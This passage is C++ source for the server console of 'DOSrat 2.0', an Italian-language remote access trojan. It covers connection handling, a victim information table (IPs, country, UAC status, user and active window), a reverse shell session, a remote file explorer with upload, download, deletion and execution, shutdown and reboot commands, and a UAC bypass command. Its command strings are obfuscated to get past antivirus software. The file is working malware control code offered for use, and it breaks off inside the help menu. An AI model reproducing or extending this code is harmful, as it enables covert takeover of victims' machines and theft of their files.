#pragma once

void StampaTitolo(short Returns = 0)
{
    TextColor tc;
    tc.SetColor(tc.Green);

    cout << "  ______  _______ ______                      ______    _____  " << endl;
    cout << " (______)(_______) _____)              _     (_____ \\  (_____) " << endl;
    cout << "  _     _ _     ( (____   ____ _____ _| |_     ____) ) _  __ _ " << endl;
    cout << " | |   | | |   | \\____ \\ / ___|____ (_   _)   / ____/ | |/ /| |" << endl;
    cout << " | |__/ /| |___| |____) ) |   / ___ | | |_   | (_____ |   /_| |" << endl;
    cout << " |_____/  \\_____(______/|_|   \\_____|  \\__)  |_______|_)_____/ " << endl << endl;
    cout << "| v" << Version << endl;
    cout << "| Created by Criper98" << endl;

    for (int i = 0; i < Returns; i++)
        cout << endl;

    tc.SetColor(tc.Default);
}

void StampaPrefix(string PC = "", string USER = "")
{
    TextColor tc;

    tc.SetColor(tc.Yellow);
    cout << "DOSrat 2.0";
    tc.SetColor(tc.Default);

    if (PC != "")
    {
        cout << " [";
        tc.SetColor(tc.Purple);
        cout << PC;
        tc.SetColor(tc.Default);
        cout << "->";
        tc.SetColor(tc.Purple);
        cout << USER;
        tc.SetColor(tc.Default);
        cout << "]";
    }

    cout << "> ";
}

void StampaHelp(string Cmd, string Desc)
{
    ConsoleUtils cu;
    COORD Cpos;
    COORD Csize = cu.GetConsoleSize();

    cout << Cmd;

    Cpos = cu.GetCursorPos();

    if (Desc.size() < Csize.X - Cpos.X)
    {
        cout << Desc << endl;
        return;
    }

    for (int i = 0; i < Desc.size(); i++)
    {
        if (cu.GetCursorPos().X == Csize.X - 1)
        {
            cout << endl;
            Cpos.Y++;
            cu.SetCursorPos({ Cpos.X, Cpos.Y });
        }

        cout << Desc[i];
    }

    cout << endl;
}

void StampaIncompatibile()
{
    TextColor tc;

    tc.SetColor(tc.Red);
    cout << "Questo comando non e' compatibile con il Client.\nAggiorna il Client con uno piu' recente tramite il comando \"Update\"." << endl;
    tc.SetColor(tc.Default);
}

void DrunkeranEgg()
{
    TextColor tc;
    WindowUtils wu;
    MouseUtils mu;
    SystemUtils su;
    ConsoleUtils cu;

    COORD ScreenRes = su.GetDesktopSize();
    short PosX = su.GetRandomNumber(ScreenRes.X - 810), PosY = su.GetRandomNumber(ScreenRes.Y - 610);
    bool AddX = true, AddY = true;
    COORD WinSize = { 700, 625 };

    su.OpenURL("https://www.instagram.com/drunkeran.e.co/");
    wu.SetWindowSize(WinSize);
    system("cls");

    tc.SetColor(tc.Lime);
    cout << "                                :TGKj}r:`                                  " << endl;
    cout << "                             =eQMv- '\"^YIPPY:      -)YVykkVc}?~-           " << endl;
    cout << "                          _u$I;           `<k0dv-^DBX]?*^<*|}wPEQ$y,       " << endl;
    cout << "                        }QZ^                  _cQ#!             `*V#k`     " << endl;
    cout << "                      !BW:             _==.      *d`            y_LcBE`    " << endl;
    cout << "                      $R            `vv:``~}Y`    (v            -z *iZE`   " << endl;
    cout << "                     \"@* ~=`      `}}`      \"U\"  ,Yl             :K-G!dM   " << endl;
    cout << "              `(kaIzUd@.  !g* `,_`m:          vsm^}Y              ,0*Y~DI  " << endl;
    cout << "           :cMPi\"     K    -Qyl:,!=               E!               ,w }~#x " << endl;
    cout << "         `aO:         `     _#x                  ,g                 *T.cw@'" << endl;
    cout << "        .$U                  \"QV      `!^^^*^:  `$*        -U=       >qVr@." << endl;
    cout << "      -]Qx                    `z$\" .rr<'    `:xyDM         VQk9v!=<**!` <8 " << endl;
    cout << "    :OZ0c                       ~gd}`          T8`        Tg` _Dc       I} " << endl;
    cout << "   :#v_D                          TQv         ^8Vxxv\\vv]xT@Y    ym     _#' " << endl;
    cout << "  `BU R:                      .)xxv~^Hx`     >g`          -PR=   dP==~-Du  " << endl;
    cout << "  LB`ry                    =xv*.      rZV_  \"Bir|xxxx\\r~!,.`=RR. `0U**Qw   " << endl;
    cout << " `#) 0`                 :ix\"     `:?ix]YTyMTR:.`````'-\"=^v}Vzd#`  Lb ~Q    " << endl;
    cout << " }# ^8TYi(\"          `rx!    `*VyT^.       ,.       `TL`     .Bx  ^#uB:    " << endl;
    cout << " QH q\"   `!v]x, `yP]TV-   _xTx: `}UV.     -V}w*   `}Qxv$y'    5R   _^`     " << endl;
    cout << "`@y`R        `*V68!@^   ry)`   *z: .VL` `x}`  *q  y#,   )gU-:gV            " << endl;
    cout << ":@x=k          i@v`@!`VI\"      'Yx`  -Vuu'   ~V-   \"dk`   >dE_             " << endl;
    cout << "!@xr}         x#!  BoD~          _z(       -y*       ;RY`       |`         " << endl;
    cout << " Bz*T        !@^   ^80             ]V     :P          'B3     ,QB*         " << endl;
    cout << " b$`^        $X     .#Y          'x=       :x.       ~B}      `b#y         " << endl;
    cout << " v@<        r#`      =#x        rL    `VL`   vi`    LB=   `Tx   L}         " << endl;
    cout << "  ^Qb\"      gT        -6I` =)  o:    xm-`xx` *}'  `Hd`   TB}}Q)            " << endl;
    cout << "    vB\\    '@!          v9Go   :}= :U>    `xu:    )Q^  _$G-  _Rqd;         " << endl;
    cout << "     -#r   >@-           T#.     _ix                *KIQ<      *@!         " << endl;
    cout << "      !#r  *@-           `x6DM:                       ,`       r@`         " << endl;
    cout << "       ~@K!,@:              !@*           -          ``        EO          " << endl;
    cout << "        ')e$@}              `#x           d`         =\\       >@:          " << endl;
    cout << "                             )#:        'O=          K'      \"#v           " << endl;
    cout << "                              *Qu:    ,yB@U`       .6B}.   \"y#Y            " << endl;
    cout << "                                rhbPMMz)`-M@Mi^!~?M8> ^zdddh*`             " << endl;
    cout << "                                           `^ThIuv\"                        " << endl;
    tc.SetColor(tc.Default);

    while (true)
    {
        cu.SetCursorVisible(false);

        wu.SetWindowSize(WinSize);
        wu.SetFocusWindow();
        wu.SetWindowPos({ PosX, PosY });

        if (PosX <= 0)
            AddX = true;
        else if (PosX + WinSize.X >= ScreenRes.X)
            AddX = false;

        if (PosY <= 0)
            AddY = true;
        else if (PosY + WinSize.Y >= ScreenRes.Y)
            AddY = false;

        if (AddX)
            PosX += 2;
        else
            PosX -= 2;

        if (AddY)
            PosY += 2;
        else
            PosY -= 2;

        Sleep(1);
    }
}

bool AutoAggiornamento()
{
    GitHub gh;
    DirUtils du;
    SystemUtils su;
    string UpdateVBS = "";
    string MFP = du.GetModuleFilePath();

    if (!du.CheckDir(MFP + "Update"))
        du.MakeDir(MFP + "Update");

    if (!gh.DownloadFromRepoRelease("criper98", "dosrat-2.0", "DOSrat2.0.zip", MFP + "Update\\"))
        return false;

    su.NoOutputCMD("PowerShell Expand-Archive '" + MFP + "Update\\DOSrat2.0.zip' '" + MFP + "Update' -force");

    du.DelFile(MFP + "Update\\DOSrat2.0.zip");

    UpdateVBS += "WScript.Sleep 2500\n";
    UpdateVBS += "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
    UpdateVBS += "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n";
    UpdateVBS += "filesys.DeleteFile \"" + MFP + "DOSrat 2.0.exe\"\n";
    UpdateVBS += "filesys.DeleteFile \"" + MFP + "Build\\Client.exe\"\n";
    UpdateVBS += "filesys.MoveFile \"" + MFP + "Update\\DOSrat 2.0.exe\", \"" + MFP + "DOSrat 2.0.exe\"\n";
    UpdateVBS += "filesys.MoveFile \"" + MFP + "Update\\Build\\Client.exe\", \"" + MFP + "Build\\Client.exe\"\n";
    UpdateVBS += "WScript.Sleep 1000\n";
    UpdateVBS += "WshShell.Run \"\"\"" + MFP + "DOSrat 2.0.exe\"\"\", 1, false\n";
    UpdateVBS += "filesys.DeleteFile \"" + MFP + "Update.vbs\"";

    if(!du.WriteFile(MFP + "Update.vbs", UpdateVBS))
        return false;

    du.WriteFile(MFP + "Release note.txt", gh.GetLastReleaseBody("Criper98", "DOSrat-2.0"));

    du.RunFile(MFP + "Update.vbs");
    du.RunFile(MFP + "Release note.txt");

    return true;
}

void VerificaAggiornamenti(bool AutoUpdate)
{
    GitHub gh;
    EasyMSGB msgb;
    SystemUtils su;

    string CurrTag = gh.GetLastReleaseTag("criper98", "dosrat-2.0");

    if (CurrTag != Version && CurrTag.find("-1 errore") == string::npos)
    {
        if (AutoUpdate)
        {
            if (AutoAggiornamento())
                exit(0);
        }
        else
        {
            if (msgb.YesNo("Aggiornamento trovato!\nVuoi andare alla pagina ora?", msgb.Info, "DOSrat 2.0"))
                su.OpenURL("https://github.com/Criper98/DOSrat-2.0/releases/latest");
        }
    }
}

void AccettaConnessioni(TcpIP& Server)
{
    int c = 0;

    while (true)
    {
        if (!ServerLoopController)
            break;

        for (int i = 0; i < MAX_CLIENTS; i++)
        {
            if (!Clients[i].IsConnected)
            {
                c = i;
                i = MAX_CLIENTS;
            }
        }

        if (Server.WaitConn(Clients[c].sock, 1000))
            COMUNICAZIONI::Inizializzazione(c, Clients[c].sock);
    }

    return;
}

void VerificaConnessioni()
{
    while (true)
    {
        Sleep(1);

        if (!ServerLoopController)
            break;

        for (int i = 0; i < MAX_CLIENTS; i++)
        {
            if (!ServerLoopController)
                break;

            if (Clients[i].IsConnected && !Clients[i].InTask)
            {
                char garbage;
                TcpIP::SetTimeout(100, Clients[i].sock);

                int Res = recv(Clients[i].sock, &garbage, 1, MSG_PEEK);

                if (Res == SOCKET_ERROR || Res == 0)
                {
                    Res = WSAGetLastError();
                    //cout << "WSA " << Res << endl;

                    if (Res == 10054 || Res == 0)
                    {
                        closesocket(Clients[i].sock);
                        Clients[i].IsConnected = false;
                        Clu->AggiornaTitolo();
                    }
                }
                TcpIP::SetTimeout(0, Clients[i].sock);
            }
        }
    }

    return;
}

bool CheckConnection(SOCKET Sock, int ID)
{
    TextColor tc;

    if (TcpIP::SendString(Sock, "checkconn"))
    {
        tc.SetColor(tc.Yellow);
        cout << "Errore di connessione temporaneo, riprova." << endl;
        tc.SetColor(tc.Default);

        return true;
    }

    tc.SetColor(tc.Red);
    cout << "Impossibile raggiungere il Client." << endl;
    tc.SetColor(tc.Default);

    closesocket(Sock);
    Clients[ID].IsConnected = false;
    Clu->AggiornaTitolo();

    Sleep(2000);
    return false;
}

bool RestartServer(TcpIP &Server, int Port)
{
    ServerLoopController = false;

    Sleep(1000);

    for (int i = 0; i < MAX_CLIENTS; i++)
        if (Clients[i].IsConnected)
        {
            closesocket(Clients[i].sock);
            Clients[i].IsConnected = false;
            Clu->AggiornaTitolo();
        }

    Server.Stop();
    Server.Port = Port;
    if (Server.StartServer() != 0)
        return false;

    Sleep(1000);

    ServerLoopController = true;

    thread Aconn(AccettaConnessioni, ref(Server));
    thread Vconn(VerificaConnessioni);
    Aconn.detach();
    Vconn.detach();

    return true;
}

// ---------------[ COMANDI CLIENT ]---------------

bool GetInfo(SOCKET Sock, int ID)
{
    json j;
    CLInterface cli;
    VectString Header;
    VectString Body;

    Header.push_back("INFO");
    Header.push_back("VALORE");

    j = COMUNICAZIONI::GetInfo(Sock);

    if (j.dump() == "null")
        return false;

    Body.push_back("IP Wan");
    Body.push_back(Clients[ID].info.IP);

    Body.push_back("IP Lan");
    Body.push_back(j["IPL"]);

    Body.push_back("Nazione");
    Body.push_back(Clients[ID].info.Location.Country);

    Body.push_back("OS");
    Body.push_back(Clients[ID].info.OS);

    Body.push_back("UAC");
    Body.push_back(Clients[ID].info.UAC);

    Body.push_back("Percorso");
    Body.push_back(Clients[ID].info.InstallPath);

    Body.push_back("Versione");
    Body.push_back(Clients[ID].info.Versione);

    Body.push_back("Nome PC");
    Body.push_back(Clients[ID].info.PCname);

    Body.push_back("Nome Utente");
    Body.push_back(Clients[ID].info.UserName);

    Body.push_back("CPU %");
    Body.push_back(j["CPU"]);

    Body.push_back("RAM %");
    Body.push_back(j["RAM"]);

    Body.push_back("Finestra Attiva");
    Body.push_back(j["ACTWIN"]);

    Body.push_back("Data Installazione");
    Body.push_back(j["INSTDATE"]);

    cout << endl;
    cli.Table(Header, Body);
    cout << endl;

    return true;
}

bool InvertMouse(SOCKET Sock, int ID)
{
    string Status;

    Status = COMUNICAZIONI::InvertMouse(Sock);

    if (Status == "a")
        cout << "Tasti invertiti." << endl;
    else if (Status == "b")
        cout << "Tasti normali." << endl;
    else
        return false;

    return true;
}

bool Reconnect(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::Reconnect(Sock))
    {
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

bool KillClient(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::KillClient(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

bool Shutdown(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::Shutdown(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

bool Reboot(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::Reboot(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

short UpdateClient(SOCKET Sock, int ID)
{
    DirUtils du;
    bool Hidden = false;
    bool System = false;
    DWORD Attr;

    string FilePath = du.ChoseFileDialog("Client\0*.exe\0", du.GetModuleFilePath().c_str());

    if (FilePath == "")
        return 1;

    Attr = GetFileAttributesA(FilePath.c_str());
    if (Attr != -1)
    {
        Hidden = ((Attr & FILE_ATTRIBUTE_HIDDEN) == FILE_ATTRIBUTE_HIDDEN);
        System = ((Attr & FILE_ATTRIBUTE_SYSTEM) == FILE_ATTRIBUTE_SYSTEM);
    }

    cout << "Invio file in corso..." << endl;
    if (COMUNICAZIONI::UpdateClient(Sock, du.GetBinaryFileContent(FilePath), Hidden, System))
    {
        cout << "File inviato." << endl;
        Sleep(1500);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return 0;
    }

    return -1;
}

bool Uninstall(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::Uninstall(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

bool RestartClient(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::RestartClient(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

bool ReverseShell(SOCKET Sock)
{
    CLInterface cli;
    TextColor tc;

    string Res = "";
    string Cmd = "";
    string Path = "";
	
    cout << endl;

    if (COMUNICAZIONI::PingPong(Sock, (string)AY_OBFUSCATE("reverseshell")) == "OK")
    {
        while (true)
        {
            Path = COMUNICAZIONI::PingPong(Sock, "Get cd");

            if (Path == "")
                return false;

            cout << Path << ">";
            getline(cin, Cmd);

            if (ToLowerCase(Cmd).substr(0, 3) == "ftp")
                cout << "Non supportato.\n" << endl;
            else if (ToLowerCase(Cmd).substr(0, 4) == "ping" && (ToLowerCase(Cmd).find("-t") != string::npos || ToLowerCase(Cmd).find("/t") != string::npos))
                cout << "Non supportato.\n" << endl;
            else if (ToLowerCase(Cmd).substr(0, 3) == "cls")
            {
                system("cls");
                StampaTitolo(1);
                cli.SubTitle("Sessione Comandi", 60, tc.Green);
            }
            else if (ToLowerCase(Cmd) == "powershell")
            {
                cout << "Non puoi eseguire usa sessione PS ma puoi lanciare singoli comandi preceduti da \"PowerShell\".\n" << endl;
            }
            else
            {
                Res = COMUNICAZIONI::PingPong(Sock, Cmd);

                if (Res == "")
                    return false;
                else if (Res == (string)AY_OBFUSCATE("Reverse shell closed"))
                {
                    cout << endl;
                    return true;
                }

                cout << Res;
            }
        }
    }

    return false;
}

short FileExplorer(SOCKET Sock, int ID)
{
    CliFileExplorer cfe;
    ConsoleUtils cu;
    TextColor tc;
    CLInterface cli;
    DirUtils du;
    SystemUtils su;
    Encode en;
    string Res = "";
    json j;

    if (!cfe.PrintLayout())
    {
        cout << "Dimensioni della finestra insufficienti, ingrandisci la finestra e riprova." << endl;
        return 1;
    }

    Res = COMUNICAZIONI::PingPong(Sock, "fileexplorer");

    if (Res == "")
        return 2;

    cfe.FilesParse(json::parse(Res));
    cfe.UpdateContent();

    for (bool b = true; b;)
    {
        cu.SetCursorVisible(false);

        switch (_getch())
        {
            case 72: // UP
            {
                cfe.UpdateSelection(false);
                cfe.UpdateContent();
                break;
            }

            case 80: // DOWN
            {
                cfe.UpdateSelection(true);
                cfe.UpdateContent();
                break;
            }

            case 27: // ESC
            {
                j.clear();

                j["Action"] = "Exit";
                TcpIP::SendString(Sock, j.dump());
                b = false;
                break;
            }

            case 13: // ENTER
            {
                j.clear();

                if (!cfe.CurrSelectionInfo().IsFile) // Directory
                {
                    j["Action"] = "OpenDir";
                    j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);

                    cout << "Loading ";
                    cli.OneCharBar();

                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                    cli.StopBar();

                    if (Res == "")
                        return 2;
                    else if (Res != "denied")
                    {
                        cfe.FilesParse(json::parse(Res));
                        cfe.ResetSelection();
                        cfe.UpdateContent();
                    }
                    else
                    {
                        cfe.UpdateContent();
                        tc.SetColor(tc.Red);
                        cout << "Access denied.";
                        tc.SetColor(tc.Default);
                    }
                }
                else // File
                {
                    j["Action"] = "RunFile";
                    j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);

                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                    if (Res == "")
                        return 2;
                    else
                    {
                        cfe.FilesParse(json::parse(Res));
                        cfe.UpdateContent();
                    }
                }

                cfe.ChangePartition = false;
                break;
            }

            case 8: // BACKSPACE
            {
                if (cfe.ChangePartition)
                {
                    j.clear();

                    j["Action"] = "Refresh";

                    cout << "Loading ";
                    cli.OneCharBar();

                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                    cli.StopBar();

                    if (Res == "")
                        return 2;

                    cfe.FilesParse(json::parse(Res));
                    cfe.UpdateContent();

                    cfe.ChangePartition = false;
                    break;
                }

                j.clear();

                j["Action"] = "GoUp";

                cout << "Loading ";
                cli.OneCharBar();

                Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                cli.StopBar();

                if (Res == "")
                    return 2;
                else if (Res != "denied")
                {
                    cfe.FilesParse(json::parse(Res));
                    cfe.ResetSelection();
                    cfe.UpdateContent();
                }
                else
                {
                    cfe.UpdateContent();
                    tc.SetColor(tc.Red);
                    cout << "Access denied.";
                    tc.SetColor(tc.Default);
                }
                break;
            }

            case 83: // DEL
            {
                if (cfe.ChangePartition)
                    break;

                j.clear();

                j["Action"] = "Delete";
                j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);
                j["Type"] = cfe.CurrSelectionInfo().IsFile;

                cout << "Loading ";
                cli.OneCharBar();

                Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                cli.StopBar();

                if (Res == "")
                    return 2;
                else if (Res != "denied")
                {
                    cfe.FilesParse(json::parse(Res));
                    cfe.UpdateContent();
                }
                else
                {
                    cfe.UpdateContent();
                    tc.SetColor(tc.Red);
                    cout << "Permission denied.";
                    tc.SetColor(tc.Default);
                }
                break;
            }

            case 63: // F5
            {
                if (cfe.ChangePartition)
                    break;

                j.clear();

                j["Action"] = "Refresh";

                cout << "Loading ";
                cli.OneCharBar();

                Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                cli.StopBar();

                if (Res == "")
                    return 2;

                cfe.FilesParse(json::parse(Res));
                cfe.UpdateContent();

                break;
            }

            case 114: // R
            {
                if (cfe.ChangePartition)
                    break;

                string NewName;

                if (cfe.CurrSelectionInfo().Name == "..\\")
                    break;

                cfe.UpdateContent();
                cu.SetCursorVisible(true);
                cout << "NewName: ";
                getline(cin, NewName);
                cfe.RealignVisual();

                if (NewName == "")
                    break;

                j.clear();

                j["Action"] = "Rename";
                j["OldName"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);
                j["NewName"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().Path) + NewName;

                Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                if (Res == "")
                    return 2;
                else if (Res != "denied")
                {
                    cfe.FilesParse(json::parse(Res));
                    cfe.UpdateContent();
                }
                else
                {
                    cfe.UpdateContent();
                    tc.SetColor(tc.Red);
                    cout << "Permission denied.";
                    tc.SetColor(tc.Default);
                }
                break;
            }

            case 117: // U
            {
                if (cfe.ChangePartition)
                    break;

                string LocalFile = du.ChoseFileDialog();
                string FileName;

                if (LocalFile == "")
                    break;

                FileName = en.AsciiToUnicode(cfe.CurrSelectionInfo().Path) + LocalFile.substr(LocalFile.find_last_of("\\") + 1);

                j.clear();
                j["Action"] = "Upload";

                if (!TcpIP::SendString(Sock, j.dump()))
                    return 2;

                cfe.UpdateContent();
                cout << "Uploading... ";

                if (!COMUNICAZIONI::UploadFileWithLoading(Sock, FileName, du.GetBinaryFileContent(LocalFile), (cfe.FileNameSize + cfe.HelpSize + 2) - (string("Uploading... ").size() + 2)))
                    return 2;

                cfe.RealignVisual();

                if (!TcpIP::RecvString(Sock, Res))
                    return 2;

                if (Res == "OK")
                {
                    j.clear();
                    j["Action"] = "Refresh";

                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                    if (Res == "")
                        return 2;

                    cfe.FilesParse(json::parse(Res));
                    cfe.UpdateContent();
                }
                else if (Res == "denied")
                {
                    cfe.UpdateContent();
                    tc.SetColor(tc.Red);
                    cout << "Permission denied.";
                    tc.SetColor(tc.Default);
                    break;
                }
                else
                    return 2;

                break;
            }

            case 100: // D
            {
                if (cfe.ChangePartition)
                    break;

                string FileContent;
                string FileName;
                string LocalFolder = du.GetModuleFilePath() + Clients[ID].info.PCname + "_" + Clients[ID].info.UserName;

                if (!cfe.CurrSelectionInfo().IsFile)
                {
                    cfe.UpdateContent();
                    cout << "Please select a file, for directory use ZIP first.";
                    break;
                }

                j.clear();
                j["Action"] = "Download";
                j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);

                if (!TcpIP::SendString(Sock, j.dump()))
                    return 2;

                cfe.UpdateContent();
                cout << "Downloading... ";

                if (!COMUNICAZIONI::DownloadFileWithLoading(Sock, FileName, FileContent, (cfe.FileNameSize + cfe.HelpSize + 2) - (string("Downloading... ").size() + 2)))
                    return 2;

                cfe.RealignVisual();
                cfe.UpdateContent();

                if (!du.CheckDir(LocalFolder))
                    if (!du.MakeDir(LocalFolder))
                    {
                        tc.SetColor(tc.Red);
                        cout << "Failed: unable to create local Client folder.";
                        tc.SetColor(tc.Default);
                        break;
                    }

                LocalFolder += "\\Downloads";

                if (!du.CheckDir(LocalFolder))
                    if (!du.MakeDir(LocalFolder))
                    {
                        tc.SetColor(tc.Red);
                        cout << "Failed: unable to create local downloads folder.";
                        tc.SetColor(tc.Default);
                        break;
                    }

                if (!du.WriteBinaryFile(LocalFolder + "\\" + FileName, FileContent))
                {
                    tc.SetColor(tc.Red);
                    cout << "Failed: unable to save local file.";
                    tc.SetColor(tc.Default);
                    break;
                }

                su.NoOutputCMD("start \"\" \"" + LocalFolder + "\"");

                break;
            }

            case 109: // M
            {
                if (cfe.ChangePartition)
                    break;

                string DirName;

                cfe.UpdateContent();
                cu.SetCursorVisible(true);
                cout << "Directory name: ";
                getline(cin, DirName);
                cfe.RealignVisual();

                if (DirName == "")
                    break;

                j.clear();

                j["Action"] = "Makedir";
                j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().Path) + DirName;

                Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                if (Res == "")
                    return 2;
                else if (Res != "denied")
                {
                    cfe.FilesParse(json::parse(Res));
                    cfe.UpdateContent();
                }
                else
                {
                    cfe.UpdateContent();
                    tc.SetColor(tc.Red);
                    cout << "Permission denied.";
                    tc.SetColor(tc.Default);
                }
                break;
            }

            case 102: // F
            {
                if (cfe.ChangePartition)
                    break;

                string FileName;

                cfe.UpdateContent();
                cu.SetCursorVisible(true);
                cout << "File name: ";
                getline(cin, FileName);
                cfe.RealignVisual();

                if (FileName == "")
                    break;

                j.clear();

                j["Action"] = "Makefile";
                j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().Path) + FileName;

                Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                if (Res == "")
                    return 2;
                else if (Res != "denied")
                {
                    cfe.FilesParse(json::parse(Res));
                    cfe.UpdateContent();
                }
                else
                {
                    cfe.UpdateContent();
                    tc.SetColor(tc.Red);
                    cout << "Permission denied.";
                    tc.SetColor(tc.Default);
                }
                break;
            }

            case 120: // X
            {
                if (cfe.ChangePartition)
                    break;

                if (cfe.CurrSelectionInfo().Name != "..\\")
                {
                    cfe.CutCopy.CutOrCopy = false;
                    cfe.CutCopy.IsFile = cfe.CurrSelectionInfo().IsFile;
                    cfe.CutCopy.PathToCutCopy = cfe.CurrSelectionInfo().FullPath;
                    cfe.CutCopy.Name = cfe.CurrSelectionInfo().Name;
                    cfe.UpdateContent();
                }
                break;
            }

            case 99: // C
            {
                if (cfe.ChangePartition)
                    break;

                if (cfe.CurrSelectionInfo().Name != "..\\")
                {
                    cfe.CutCopy.CutOrCopy = true;
                    cfe.CutCopy.IsFile = cfe.CurrSelectionInfo().IsFile;
                    cfe.CutCopy.PathToCutCopy = cfe.CurrSelectionInfo().FullPath;
                    cfe.CutCopy.Name = cfe.CurrSelectionInfo().Name;
                    cfe.UpdateContent();
                }
                break;
            }

            case 118: // V
            {
                if (cfe.ChangePartition)
                    break;

                if (cfe.CutCopy.PathToCutCopy == "")
                    break;

                j.clear();

                j["Action"] = "CopyCut";
                j["CutOrCopy"] = cfe.CutCopy.CutOrCopy;
                j["Type"] = cfe.CutCopy.IsFile;
                j["Path"] = en.AsciiToUnicode(cfe.CutCopy.PathToCutCopy);
                j["Name"] = en.AsciiToUnicode(cfe.CutCopy.Name);

                Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                if (Res == "")
                    return 2;
                else if (Res != "denied")
                {
                    if (!cfe.CutCopy.CutOrCopy)
                        cfe.CutCopy.PathToCutCopy = "";

                    cfe.FilesParse(json::parse(Res));
                    cfe.UpdateContent();
                }
                else
                {
                    cfe.UpdateContent();
                    tc.SetColor(tc.Red);
                    cout << "Permission denied.";
                    tc.SetColor(tc.Default);
                }

                break;
            }

            case 112: // P
            {
                j.clear();

                j["Action"] = "ChangePartition";

                Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                if (Res == "")
                    return 2;

                cfe.FilesParse(json::parse(Res));
                cfe.ResetSelection();
                cfe.UpdateContent();
                cfe.ChangePartition = true;

                break;
            }

            case 122: // Z
            {
                if (cfe.ChangePartition || cfe.CurrSelectionInfo().Name == "..\\")
                    break;

                j.clear();

                j["Action"] = (ToLowerCase(cfe.CurrSelectionInfo().Name.substr(cfe.CurrSelectionInfo().Name.size() - 4)) == ".zip") ? "Unzip" : "Zip";
                j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);
                j["Name"] = (cfe.CurrSelectionInfo().IsFile) ? en.AsciiToUnicode(cfe.CurrSelectionInfo().Name) : en.AsciiToUnicode(cfe.CurrSelectionInfo().Name.substr(0, cfe.CurrSelectionInfo().Name.size() - 1));

                cout << "Loading ";
                cli.OneCharBar();

                Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                cli.StopBar();

                if (Res == "")
                    return 2;
                else if (Res != "denied")
                {
                    cfe.FilesParse(json::parse(Res));
                    cfe.UpdateContent();
                }
                else
                {
                    cfe.UpdateContent();
                    tc.SetColor(tc.Red);
                    cout << "Permission denied.";
                    tc.SetColor(tc.Default);
                }
                break;
            }

            default:
                break;
        }
    }

    cu.SetCursorVisible(true);
    return 0;
}

short BypassUAC(SOCKET Sock, int ID)
{
    TextColor tc;

    cout << "Tentativo in corso..." << endl;

	string Res = COMUNICAZIONI::PingPong(Sock, (string)AY_OBFUSCATE("bypassuac"));
	
    if (Res == "")
    {
        Sleep(1000);
        TcpIP::RecvString(Sock, Res);
    }
    
	if (Res == "OK")
	{
        tc.SetColor(tc.Lime);
		cout << AY_OBFUSCATE("Bypass eseguito, riavvio del Client in corso...") << endl;
        tc.SetColor(tc.Default);
		Sleep(1500);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
		return 0;
	}
	else if (Res == "NO")
	{
        tc.SetColor(tc.Yellow);
		cout << AY_OBFUSCATE("Bypass non riuscito.") << endl;
        tc.SetColor(tc.Default);
		return 1;
	}
	
    tc.SetColor(tc.Red);
    cout << "Operazione bloccata dall'AV." << endl;
    tc.SetColor(tc.Default);

	return 2;	
}

void Sessione(int ID, SOCKET Sock)
{
    CLInterface cli;
    TextColor tc;

    string cmd;

    system("cls");
    StampaTitolo(1);
    cli.SubTitle("Sessione Comandi", 60, tc.Green);

    for (bool Controllo = true; Controllo;)
    {
        StampaPrefix(Clients[ID].info.PCname, Clients[ID].info.UserName);
        getline(cin, cmd);
        cmd = ToLowerCase(cmd);

        Clients[ID].InTask = true;

        if (cmd == "help")
        {
            cout << endl;
            cli.SubTitle("Client", 30, tc.Blue);
            StampaHelp("Reconnect\t", "- Scollega e ricollega il Client a DOSrat ma senza riavviarlo.");
            StampaHelp("Killclient\t", "- Termina il processo del Client.");
            cout << char(192) << char(196) << "Kill" << endl;
            StampaHelp("Updateclient\t", "- Aggiorna il Client con un eseguibile locale.");
            cout << char(192) << char(196) << "Update" << endl;
            StampaHelp("Uninstall\t", "- Disinstalla il Client dal PC remoto.");
            StampaHelp("Restartclient\t", "- Termina il Client e lo riavvia.");
            cout << char(192) << char(196) << "Restart" << endl;
            cout << endl;

            cli.SubTitle("System", 30, tc.Lime);
